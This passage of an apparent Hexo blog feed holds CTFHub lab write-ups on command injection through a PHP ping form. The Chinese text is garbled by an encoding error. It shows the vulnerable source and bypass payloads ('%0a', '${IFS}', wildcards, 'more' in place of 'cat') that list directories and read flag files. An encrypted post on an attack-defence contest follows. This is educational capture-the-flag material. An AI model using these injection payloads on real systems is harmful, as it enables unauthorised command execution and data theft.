class="hljs-number">1</span>aï¼ˆä¸€ä¸ªç¥å¥‡çš„è§’è‰²ï¼Œä½œä¸º.batæ–‡ä»¶ä¸­çš„å‘½ä»¤åˆ†éš”ç¬¦ï¼‰<br></code></pre></td></tr></table></figure><p>ç”±äºè¿‡æ»¤äº†ç›®å½•åˆ†éš”ç¬¦ <code>/</code>  ï¼Œéœ€è¦åˆ‡æ¢åˆ°ç›¸åº”ç›®å½•ï¼Œå¹¶ä½¿ç”¨ <code>;</code> åˆ†éš”ç¬¦è¿ç»­æ‰§è¡ŒæŒ‡ä»¤ã€€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=;<span class="hljs-built_in">cd</span> flag_is_here;ls<br></code></pre></td></tr></table></figure><p>cd  è¿›å…¥flag_is_hereç›®å½•ï¼Œls  æ˜¾ç¤ºflag_is_hereç›®å½•é‡Œçš„å†…å®¹ã€‚<br><img src="https://img-blog.csdnimg.cn/20210116134947994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥çœ‹flagæ–‡ä»¶å†…å®¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: ?ip=;<span class="hljs-built_in">cd</span> flag_is_here;cat flag_3708221509571.php<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æºä»£ç ï¼Œæ‹¿åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20210116135639397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="å‘½ä»¤æ³¨å…¥-è¿‡æ»¤è¿ç®—ç¬¦"><a href="#å‘½ä»¤æ³¨å…¥-è¿‡æ»¤è¿ç®—ç¬¦" class="headerlink" title="å‘½ä»¤æ³¨å…¥-è¿‡æ»¤è¿ç®—ç¬¦"></a>å‘½ä»¤æ³¨å…¥-è¿‡æ»¤è¿ç®—ç¬¦</h2><p>é¢˜ç›®æè¿°ï¼šè¿‡æ»¤äº†å‡ ä¸ªè¿ç®—ç¬¦, è¦æ€ä¹ˆç»•è¿‡å‘¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!preg_match_all(<span class="hljs-string">&quot;/(\||\&amp;)/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        exec(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä»ä»£ç ä¸­ï¼Œå¯ä»¥çœ‹å‡ºè¿‡æ»¤äº† <code>|</code> ä¸ <code>&amp;</code>è¿ç®—ç¬¦ ï¼Œé‚£æˆ‘ä»¬å°±ä½¿ç”¨ <code>;</code> åˆ†éš”ç¬¦ç»•è¿‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload:?ip=;ls<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210116140338276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥çœ‹æ–‡ä»¶å†…å®¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=;cat flag_64982941521735.php<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æºä»£ç <br><img src="https://img-blog.csdnimg.cn/20210116140509312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="ç»¼åˆè¿‡æ»¤ç»ƒä¹ "><a href="#ç»¼åˆè¿‡æ»¤ç»ƒä¹ " class="headerlink" title="ç»¼åˆè¿‡æ»¤ç»ƒä¹ "></a>ç»¼åˆè¿‡æ»¤ç»ƒä¹ </h2><p>é¢˜ç›®æè¿°ï¼šåŒæ—¶è¿‡æ»¤äº†å‰é¢å‡ ä¸ªå°èŠ‚çš„å†…å®¹, å¦‚ä½•æ‰“å‡ºæ¼‚äº®çš„ç»„åˆæ‹³å‘¢?</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!preg_match_all(<span class="hljs-string">&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        exec(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å®¡è®¡ä»£ç ï¼Œå‘ç°è¿‡æ»¤äº†<code>|ã€&amp;ã€;ã€ç©ºæ ¼ã€/ã€cat</code>ï¼Œä»¥åŠ<code>flagå’Œctfhub</code>ç­‰å…³é”®å­—</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.æŸ¥çœ‹ç›®å½•ç»“æ„ï¼š<br>æºå‘½ä»¤ï¼š|ls<br><span class="hljs-comment">#%0aä»£æ›¿è¿ç®—ç¬¦|</span><br>Payload:?ip=%0als<br><br>2.æŸ¥çœ‹flag_is_hereæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶<br>æºå‘½ä»¤ï¼š;<span class="hljs-built_in">cd</span> flag_is_here;ls<br><span class="hljs-comment">#%0aç»•è¿‡è¿ç®—ç¬¦å’Œ;</span><br><span class="hljs-comment">#$&#123;IFS&#125;ä»£æ›¿ç©ºæ ¼</span><br><span class="hljs-comment">#flagè¢«è¿‡æ»¤äº†ï¼Œä½¿ç”¨é€šé…ç¬¦*ç»•è¿‡</span><br>Payload:?ip=%0acd<span class="hljs-variable">$&#123;IFS&#125;</span>*_is_here%0als<br><br>3.æŸ¥çœ‹flagæ–‡ä»¶å†…å®¹<br>æºå‘½ä»¤ï¼š?ip=;<span class="hljs-built_in">cd</span> flag_is_here;cat flag_216371105627974.php<br><span class="hljs-comment">#ä½¿ç”¨moreä»£æ›¿cat</span><br>Payload:?ip=%0acd<span class="hljs-variable">$&#123;IFS&#125;</span>*_is_here%0amore%09*_216371105627974.php <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTFhub</tag>
      
      <tag>å‘½ä»¤æ‰§è¡Œ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>çº¿ä¸‹AWDæ”»é˜²èµ›æ€»ç»“</title>
    <link href="/2021/01/16/%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
    <url>/2021/01/16/%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="æŠ±æ­‰ï¼Œè¿™ä¸ªå¯†ç ä¸æ­£ç¡®ã€‚" data-whm="æŠ±æ­‰ï¼Œè¿™ä¸ªæ–‡ç« ä¸èƒ½è¢«çº æ­£ï¼Œä¸è¿‡æ‚¨è¿˜æ˜¯èƒ½çœ‹çœ‹è§£å¯†åçš„å†…å®¹ã€‚">  <script id="hbeData" type="hbeData" data-hmacdigest="b69457d6dc85e03c460c49fa1ef6889e3a2e2dcf0f3301784c2769d594e28c2e">fb006b16b8e5177c9c740fc4ecc8cf66a82acd6888d2edb52d5f9c2e2e990fc0db9c929653526f1214957a42441ca59c2d5f0f20d616c290f7d7f72fd71018b30d6d2bb60d9e5d885d04fe90fad7421b8e5e6b8709f4e872e05dffc5861375706d3f9865827b0dd8b6f9e5ac84b26ebc95578126c89aabb263da3e85461f614c9c9fcd34068abae0a4b84ce4d14bb64c8d5d7fca30f60280edfc8e818b7cc7fbe1e7a30f48fc639abbd6cc33fc28429ea8ed3c0766e5af661d6a7a28e1dfcededbfe1c0378f608bc12c3d619050664c23baac897b899cd6089486114cc2c716ad53209dec60e93d13f57000e14f4affb1d2ec3d18cb54247df5c0b117b80feef8766f04bc72288d4ef1546b3513636531ef4c3fae902adea48f309298949129b313651b265e509acfa15af67aeb9f0a9096ab90b5b26b4f351e1afd57fd74334606c460a84458618f7d6a79c0c19c6fb5a0314c8e101cf4d5f22d38e8b78b6e51e618b3dce972037f1b619b8c833fe0ef978167c83bc02e18da78bc3529aa3755db666440869cea64c4174f525ae92d95540cfe969b332781f338e207b57c66f5de4943600a3542e68b0ae668e2a3c87b323825b5eb1d3d0089ab0a377b5fd9eac5a6f1e3020656539351258b3175dd56c408103decd56fef54144b36ff9849e4e3d63923c4b109621837bc0dcf88442b92b3cac3509d334026227a95fe23cdd6ec1f4d881b083ba522253c29da72e0c358276be1794b4c63629d778fc25e2a6b3e06d05ac3e734f18ffebd9276ac432206bccf7037f0076888aa871af1e674f8cc20c2816dc8217fc04105a53b1d09780de43f5886abccc18624bcd5776073ab2a563bc35f1153fb2715a9002fa27c2887ef8c595e63f7ecdd7c569e390bbd54fcb7d4c1ef3b46c94bec856d55da21b83b97c7403d9c92706eb66bc164751d4793b520f9e9d949ba47f8961673fabc81b533262970094ae739169c13d3786fba4da3c484db1b60bbb46ec4ee561eaf01b78d4257ca0732f814b12df630e961c6d36c50be28f7334951cdfc1a7eca82ccdba355b50ab99431f2bb5a5411521cfc01746cf4d20e156f486d58da5a65fd4e130ae145194708d827af128a213f5c25182b05bc090b9dd0c54c000ad84831085ea56e0139834dbee9ed315e740867d1d75528020e3031ca1cafb247fc96b31b4af1f311391493851267f60cff37b559d2fe39e1945ba19cf96c78c3b8358b044e12a56eb5a4a022fb866ad15ef5af70844759ce8b2cbe1b26367fbc3cea7635afbaf19fcea4ea9fbcc5134afe088b1e18ed27923b6417b9c5fedbda8d1252a66a1ea61d0ae0101e31320a2138efddbd37e7981613903cedb25ce4581a4c6c13627b22a2712073682669caab3a2f7c104bf9c1a6647388a01e538d2f7a080cd6b7bcb7b6c5775f047cc854067e04caf2622869633d4c3572566db5e711c2b4208dc33303beee404387486cd2710bd51fb721a55021e25896e9ab6490dfc0f706d846e8408d1ba841302f5cc113913d7103219ba70cf41f5f8c55f7504bf5efd9c743d84d97dcdde8b93e9595d7812a95e51d7d4e6a0679dedabda4825d61dc6cce5fc443214264d9c95db8952d6735d120dc118a97f28c3c3a7afa7c2a3cd8411714cccfc8cc7ed125b84e30127a816b967b1970a842a565dd8f38db74fc5a7f5e8b9e318bdb9b782a35a781cd0be9052a0a2405c0544a9c42b8994c9ec8a186a8d900aae3db33d067c6c927b394912f95476c4a1b40fbb2d4e5d71eb5c83caf804292fe0fd6c5bf8a440a541f5b48549a6dda9973ef56250752d0aa3ea6c7d374c7b5f19932c11a58ee7a32e1dc8a45972246d44ca5caeef4fa6a3955f32a012dcaa5c8373a3b316a887208565dc23b50a7e773af74a08dc7212ebc512df49db5aa0e0bd81ce01237f9ef2fee2a1a72cb1b284952d485e0aa339eebbe73c66febfa3b033db8b58bf1051d86280c1037e8893733935deb8191b7cae5ba3658bc41957183109cc6543daf5c2eadebff7c45404ef5669c8c43774bf659f65edcc6c2b0168ef3a76908adca2a6cf30f78d95403d0f9bacd910f66bda88f00f981bce8808a5b3890b2f626f8ba75db0a7500b14986201c9e6a990980046ae91d46f72ee8ded436b07cafb956c968b627af3d63dd4e2892e2750a2a6171f3d743070d0e03c90ce1f1be3b5cf8ac9bccd061dba00d72bfe116e6545c7b38a13b1c2d5d5bae04bd6ce7bb0b1760359c230bfd00397094e322fdf1b09740d66fa42ab2cf35a2c4f8ceede7e0d4c1a628648018e00aaead5e064a46ed2a7acf82ad1b9f8fe0ba7376298881553c74ece6d4a8664743c6ee10106babcb40b2802be367d5b6e210ff238facfdb6b80091f044840d5cbe66332b206fdb984f26f7ef32927a5921ebba6efe4ebb0febcf5f22afe0d45d896a928ce41cb818929fc869a6dcb06be37a7d6ee3e69ab1daa59426c97d45c7451dd45153eeca97124b17a75e20edec131b525849f1f16bc24900fae1d979b9848457c5c5630f69e01fa7c3eecaac649181bffe396ea92c33443b8569479ec933a0e9766b1577c2993af600f2cca63f086e1907e52a120f6f28fb778c2d2a8e5aa65410ab5343800cb23ff7f630e00d2647c873136964a626b373755fc242b16e0efafc831441367d00945a3b8bd26bc73204fa60f2cea06a71809fbdbb12dc78e2d140d3b00f6f4e44605e799f532fac72558acb186e68dec05c2b76069bcc8ceadb7635363c2bcfbb798bc0aff9032a59c6d78a75cb1cae8e3887ab1d3344bec661361033d25e8efd11755615cbb2ce4ffad70271f8bd8f4963724bda9c9a019642d56eb9e6c45d74750ac8c809cd694de4879ef84cd595100f0149a2349f0c347ee8370114db9d3201f4f93ff9c095788484357ea1f49bbff3792206d3e542e2ec2843b4730f0aa039e8ab41ec02e8d817bfaf039573e4a366ddcf76ac0b501e14358ae152b630e4628831a1d41499c535bf09308af47b92a4f488518ed1572b0ea6dd9981ad3690fb28e769a1b758b91d66f8892f5fa54eff6a7a95e1737f54bc320c0485d8e1babd98d5c72527256bc84ddc3a206ee1244eee8b1f36a286b3f3f970fcceaeac1eba03b1b930d84369d809dae0d531edb4e34b2629ac6d0911830d81b11753ea9576d07824b2fdd09adefe895086e79660460f689e88b82bbd90f7a4ad06d8651eafe3f195dc7b6e6fa41058496eac00a6d17b8c933c38756320316e5fb8e39971e2c7c9360a9cd96d7152917f66475fa15386351021c10f1355b0192a133ba81f3d2ad05241ef409f98e6d4506a3a0fc23ef677a0e20aa2e44d8f0438f241655e679bb7e27bcaa3055f3027b3e5705a0eda56bf68f43a3cad371ced982df763bf456e58190cde7d5b1104d3c9886c59572a265550d2bf34b4297d4b5f19a81ec3a3b499df4555edaff271a3a45461825bd7b0d133540d39fb46bcb9141681d73e3cd9ea1fd243a4d3af4f61d279e1bc8f55215214a27f4de963f6cc801e8db88ffc1b102cb7ad9b2f6d33c134be393e7e0af151aa693c1e4637d67371a5139d90a73410685b80d93a7247de200654ad4fc8e0fa5d7c218dc1b770357be41d7d954f07a8972b28bd099fa15db152a374e7d007c735f8fe3cfe4335603239e07d78140a6ff0d6af45fc6d5e68669efb0f6070dc8d1dbf751286f4f6235980d77cb254db8eac17329ee04b6f0519c76ee74fa9597b0ba2473c64fd91f94fe20332a3693dd2a8c52dafbe3f6376fe464553ec99dfabd56b00c73b1f57397d2bee9c167b9bf385dc05d0101cb7e1ba04bd57bd707ed8a9c17d6282f2154011a40d04c06df152a5201e2ec63059d30f759657ae77c579e8e6688e0001a3e4dac981ff208213b608c7bc91e73c2b15c9cfbf7b6db59a0b98a8528d3912ff4023ecd979185e800d14c28aa6d011614a5e15abd851054399ed19f3ddb1892a1714cdb940507b71f057b77b0f7f44f2e57425fd0899e5931c0789981d532f301b5a94b3ba674bcf70e1748a8b91baeb13a025606ead5eec14cce0d7e1c54a4c6c3a8124d4257cf10e69506c02f64f937cba5c19469a73958c0b7496380f4b3e4edd1de2b3392046f9333599311307b6b35a14bee1edf2fc8c4b6cedb282b4ba2543c04ebbecbc17e8aa23be7ba4a12072c1bda331b08ac24648dfa5a6cfa408118bda01aa249b2c63ad3357d34afc3d17a61c39a8c375f2058b74675612a6bad75517f8c46e4a8e857c035b71c16df071c17b3f7c7692256abbf45bcf69ebb4c5aa92556e685e72b86a6fccae59961f954d9f2e6449e5350c4d0585a13f31f4adba921f41891f70987aade98979fea8b14a3dc6c17d75deac04121bd3336d363a0c147adf5fac4146ac62e3e756eb2cb439b333aac4f9881753a001220aff2b2ea6ba2737ddcf41a866021ba0860971a858cdcbb0450a8762135c4e5d65d6695ff2b68ea4d39029685547f402d9a6fffcb59545996abb27d0aa1820b19522db939aebd455f99821256c3b34e344aeddcd0854b4512aa57ab7dc1ed61988b6e6e0c9ad208fe91407ffb92304836dd7c436710140bc7c631a57fa2600111b2d91adb96747190fd02d326075cf8c642e96c8d649f4cdb77ed174ba7427876a324255fc6a8807df82c275ae510e890df7af8f5b0b3f6fcbfd608bbf8cdc6ded7ad19f008b7f1cbf5b215170ca8d760d69743ebe2129e640af06f764f8801f4482b649f0070aa63a055ad017812b549bfb569b9ad5434b1df1b1f4b702bd1dd43f2109dd5286c88d3fe12aef72711d464400189769c435039bc24db573d9cd9db5bf0475816773190db818630d2db0d7f5f1be911c4f2261e21f5a7e5e8c050dbd6698511d360829a9c61879d6b8ea33f1c9861ddf3014380a90f2d003d5cc00850c9cca1254f69d51dbd34454d4b9c48b8d220ec649f3b94008abf5b6d2a41444cdbd9ab834dfe9bbc3149465551b5bfb441b6d4de5f86149e2415b9b33e60530e5f051cb972a853537b65ef63ae1a1abfdcfeb7aa4b081613004b5bf4d10c9fab9653bd4338be4b8a161802f353954ddb32974aa1ffaed21c077d68a37a0d167badb243be100ad31680e7000708a21aa9c7845472cc21508d65cb74c3e5ff4b4b1c0eeb17ebd58a2f3c74fefbb1614fdede3fa5a85adeb83c0e55f955ad4f5992ed78d498721ab30d249fd7bf97cf2c8bf9198c6302b7ea78afcfa2fe5ff657fef42dadc250b7294c31c713df3546010d3fc4b90f00a1514499833455ba4e89a6d3bc69fa98312fe2daa842d317d7deb181ea4ca0b536c7165c98017a42a82d8bb322a1d5b43836ae350b8c613125477204e5620a6adefa49ad171d69645bfc209db09b665a065ca4c296b7bf0c510513e2fcbf748f4f6ea5097a40357bf91ed57aaef0e9b76e5d00f0f0195ca138fe89a76c439c28964ab4cb5d83b56a988daa49ad254df8767e0b0ef0110139e27866ba7c80b6703d043661384e4a0e29e0188b71f6fe0d64cdc544ec2d2d434f0608b40ce1bbc6335bf8acb076900e2394972f620d9f94855ec319309d3f6116d689a492a13c6e957a8bc331e36bd608a90ce10b8ccce01670b7f0ebd82278d8905f12cef4725668816bab899fe431b241abf5bb1ddc7286134cdbb767cdb41dbae6a4eeb512c3e08e5ba7b2bb80526c5864a736bc7d8572291a3f6b1ade2647089f6fa73eb92c9c40d2a83290f84595d7eec6f4c1e9dd1ce63f4483ab569ba589542a74615b7380b7f53412fed41b7fe4e689f00630615e050cc099b96e9ea5f826c304ca4b932010f3c4613935b11d7039023ac96dde7ebe9ba31c7d66515167d88804d8e50fa3574d361120d5d194ff1d6b34c3c140752489d5232a97559cc1c5946d10820d1704c2ca51dba6d17701c35fa4d3076f0909d5580cb39718ba4f21c426b3cefe6d8d6d9000715bb05f96b74d4063505e9500e12bc3429c0c92463393e85c001da35769b1547077f91db745e880ae6b7b4d9d363d2ae8a0db9dcc4a2b206bbda4eb3b250830da5fd0b865c832f89e4e5c038ae7a24caec1d97400cd62a53df2b12ecaf5e04db3e96a083c6b4a5e34c7717e5d135d0360ac69473f0c76354856c475a8b214104ea2959f882f105157e6a4b147266b49f2eff7ad17cdd355f00ba5ec3a101dd1433cce44a9cc535246c4a4eb9c37cfd1c1e8959d208b286706ce4fdf76ec902f291f23b5e9f8a42fd299798e5b65a81def2a5b23ad4002a972caaaa34c2df045a5ed5d9d32fad44010cde11f3061cf332a1d4a86b174fa72eaf534f12bd178e10f92092261b5a69c615410e62c36f2fd6b65847194685c7b8ab8b570e573b87fa00dd280bb28140b69b66deb4507bd5c9aae73da53faa30c1ff0e91c1aeed6e685bbf2ee63004fbbb9a629d9774bd57909b5d364e1384c8025903be5597ef70be841ee7f95901d14969f95ed2142489654bf9049858823d0cb3ac1129bfc95a55c6c5815a22d27adb5b172e9f198170e50756e2b3e08dab3893b7fa929dee8b8fb2760dacee43fb992b68d27a67ff4956635370e0d7891c99befd5e247bc4f61300fbb19b2b9c5ccc9a713b3d42f8995dd3c72555073bebe1c52703bc85fa6e224e10c135f23d9ad746e2dd12634cc7a490e5b01dd71720f8a273db47d6e382745c632dd47fbeaef4c307ea01c8e9c1bade8421c350a8b3226628954385f99621f6372c06fff6342111ef60809ff6294d88573a32f37677b6fdc1cc1cf1b0ebc516930c7edfe138427aaeb060a90cb62f74cd2258302f1e1009eea019c70b53c04c56287e1ac5a6e3f04ff21aa329e6d7460b7b7fa6b41a0456f1aaa30c883acc55a8442242b1910ca8d6b120873bdc26341d64b2e1ac53ea6157a09d66ef5970896bc3737179502b683f7d48dcec4fd9be58ad9d8c95e90cf95e1f56e1b883b09ff8bb4d02097c9ac4d1db7e07e05d6fb41a4db9000d0f5c94def991a8a16615bda038007314f69a0663a61ee2d2c387454260615f3c1b144a7f53344eb42592144bb5136d59568789b04475e9e442fe5bc41136e4e982a21d8312ea9870b66bcb30e49212327abe4b666eef03a5fde1c400c3e3cb4b08f65abab3fbf5af2313d5c73d2a5cabf9740a349492cfc4df1860a13367e60c203202ee3d79a40678609c5dd7ebd8edbc3cbbf587e216945d1c6f15b6af368cbc733636d7d323c0a705c957b1737b24fd4d4a95101a0f29fb26bc101126d1d25435b827f5ce7eeea1b787ff0dc405a55d89ce2ec405fa7f26055f01ae92619115645fb6a9b41bbc39e7b0fa6053257b7c07333b82ccd8caea4695b5597e67762a3616d9366b3875d34e9d0aee46cbd5049879a102d865639160667bcbb30c63a28b0349a2544c237fa849f1d2e440d4e1973b6816604ced37ab3ad90e2011e780683a98ce7f6f8d2cdaa3bcf17484ef315a447d72452ba675835b551696ef9864a068ac8b34351ca671d3c3f7f498ebb62eea6f36652a2640f3ed4101ac01407f01a40d8ae195551d1c177b11f796addf6dbf9562be72533f232b168aed7836f8393ed42d64d6d70046a1d76fa561b25becba3e3def595071c0cbad127bb978849869850bf4db1e71b7b3667bc99ef81a3507d8eaa18c709504beea2eb84676f85ffb65440f90e53e99b7ab4d5934442688e2e57424ac827d0c11177380e0d4c5dbc555635c76586b1abdc2caf22e67c622e1ff4aab90f3ee2d167119cc93b91632498f2a1362f43ffc10539e288f24f26f94f1893b8b7616124032a76fe181e74fce5b4da289bc5fe01a8f881d7cd9e1e83c3d0029445200c50effed76315b8b672ab6075106203e2eb69120eea5534372930c9d026ee7eb40019322c7a8332b82952d6b9c8d303fc211c868847bc1599c762bb7b17d318cf957d8cb173d17b8a4da7a9e6b70297e096f067343faf9453e582f8f5a93dd99d4c5466ad961146197dde7263b1068b4447a83488849e14c5f8a6270aa76dab7428a4b8db1d5801737822b156f606a2e8f78b9a08811cdc21ec654b69f92a1a1aed7a19037095f4c45d775c5b39eef17d34eca43656ea0846c9bd7c97fcd9869ad30c0c30fbc9cf722c5de4d5abe775f51532b9321aaa5dfcd86f722db944f5016adc91388edbd27b3b432ba2691c08eff84ec75f8776e8c36a23fa7838a3c1482b2d6b3d4e42dfe3c3a3ce204f5557b331a546bf39420dcb6dfe77990e45a2efb5060f38c4cd20d4e8d859174a15732c3e6814208bec7b8296f3854beb08c4dbafffa24d354e80efde672c3316ffd969be8325e63f5ffb8afa7d5d2c116302694f84602bfad467178ff52fd767af3b8bb87ddf41de25919daabb36157ccbb3ccaa652329aec817cc084fc9be923c864b491b4ea0a58947ced8a3105729b67d7f28469f7579ada6acf4b6a365d33e11f73eb4da7d0c8095fc6b1b4933e4601d6fe8a45c89dc2dcbc2b3b5d16c5a6a11f6d6c5d58ac477ced689f2a3e13d2cb01f1b982cf24930762dac8b3cb568e42d61ca824f55a40143a9957238f80457a6994eb3bfd14af1ad6424475fca04ce7377a5872d5468de6b563703b05c6e57a7be876d4e7c6d2a8388453c9d369513aa36435e2b9941b3fc2efa6f279ce9f5be0613fbe1c8667b7bd8ded1ccc6519a38d1dae3b010faa6c0946e3031db6f6c3305040512e0f392124b4d95acd039db50c8eed6a84df6d7a65f6a89c3609b0b10345c9dab6864acf0393fe396bbc68eda09a64670b874e8239cf3870d3642f16cc6166052d7faa573b7c1e3f8cfbf72c92970b95cba6e7de7c8da945f2cb2e276b3325553ea16ca3824a5793d7c77280269ffaf7575535bdb751bbeb290eac20ece89403a5edacf3875c97f533b6fb7f283ccdc94daf171bff0286b42ee4f7575335fec91878d7f9cca1f431f768c25010c9316eac211dba5cb47467349597e5872160b8dfbdf3d273c96e0f5b55225b1f3f8611543c0c2cee918acf4e05756a6484c8a16362a7791d9964309b4609cced992a8fd69b1b62784a77bf1cc815de5ceca1cd1080276de98f48a8a3061d869e1c0de4536ec4beaed77bc3cc220fe727a382cee2b4130ce19a90a64073064d423bce1cd89af95402dd2cf90962ccc2c1fadee3b04e3fc4d314853f58228f1a7a83b1f5fc9af97418e36622cd2f564582270916997189990ffdc3ecace017da0f04b8abb905364625cdb0af2bb957d97facb402602634aea1b748ba8c28191060d56da97c586e701dcbe0311026be9e0baebf4d32412655a556cde5ebdcee5d97a9fc8d53d843de9486512402b619af4f37697d764457a3bef662d5f6cb0ea813481169027f8cb9039dd4d40b4106f276a87436290c499034fb9f10c04e237b10185fc5905e96df70814c4e7222ddd9188cb98f8037608c32f6ed186a84c9e466c290b51a907903ceac5cee74f2eb31d0216ea3494673aef50cdf86645430d202fb4651f9f5227b3f4c68d833f5dec498bfc1d9aa47d9a3fada96663d4b56c9242fdfd5a02fa6d951d550a294a4f2f34cb6f7ea1b06f6370eef854216545eff86986f9eb0b6f777ea3637aa6775452840b857decda90f28e6242d8e8b8365fd28e569fe0b5fb53124ec13049cfbdcb239d34d031cd25d1b3e06e2c3648c268f543f92fccbea61b90139f0a9ffbdfa2ab0937cdd6acd46d206d2bc01201b662410dd0813b70ded1352d8e62886ef9e5535a1430935ca294cd16e63bab0a74ffe252609cc50b0df70661cfecb4efc1664118627daef935c27e6d2795f5caffe7f494feeebb1b806c1332254dd3037f38b0487048ffc4cb5dd31beae188048cd7ce17455f4d7794d47d576443089443e4f9c603c0074d2630bbd28aa51f945d35946d7d0be657afc6d6329daaf87a98d1eea112af6a18a156e51668946057d5166e7ea809695d7e0f82038f4edc835db3b84db54025e7838444fbdbeb7a54663930183140fbf4b786f8744983ca105597fda5f76622df30d8d6047468674069615195e3c249d7b5d39d89c5b5c5f97621353a0a0a34e28aa059073a82b3d90900aebd63dccc821ffa5fb4f63372dce989f7ad51512ee018f544a98d10bf38fed8d401043ebb6c16c9f